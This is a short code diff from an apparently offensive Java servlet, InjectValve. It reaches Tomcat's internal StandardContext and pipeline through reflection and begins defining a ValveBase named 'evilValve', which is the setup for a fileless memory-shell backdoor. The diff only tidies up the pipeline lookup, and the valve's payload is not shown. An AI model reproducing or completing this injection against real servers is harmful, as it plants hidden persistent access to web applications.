@@ -32,10 +32,6 @@ public class InjectValve extends HttpServlet {
             contextField.setAccessible(true);
             org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
 
-//            Field pipleLineField = standardContext.getClass().getDeclaredField("pipeline");
-//            pipleLineField.setAccessible(true);
-//            StandardPipeline pipeline = (StandardPipeline) pipleLineField.get(standardContext);
-
             StandardPipeline pipeline = (StandardPipeline) standardContext.getPipeline();
 
             ValveBase evilValve = new ValveBase() {
